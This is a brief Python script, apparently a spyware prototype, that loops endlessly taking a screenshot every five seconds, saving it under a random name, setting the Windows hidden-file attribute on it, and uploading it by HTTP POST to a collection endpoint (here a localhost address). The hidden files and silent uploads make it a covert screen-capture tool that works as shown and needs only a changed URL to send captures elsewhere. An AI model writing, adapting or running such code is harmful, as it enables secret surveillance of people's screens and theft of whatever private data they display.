from fileinput import filename
from random import randint
from time import sleep
import pyautogui
import requests

import win32con, win32api

url = 'http://localhost:5000/rec'

while True:
	myScreenshot = pyautogui.screenshot()
	file_name = f'file_name-{randint(1,1000)}-{randint(1,1000)}.png'
	myScreenshot.save(file_name)
	win32api.SetFileAttributes(file_name,win32con.FILE_ATTRIBUTE_HIDDEN)

	files = {'media': open(file_name, 'rb')}
	print('sending')
	try:
		requests.post(url, files=files)
	except Exception as err:
		print(err)
		pass
	sleep(5)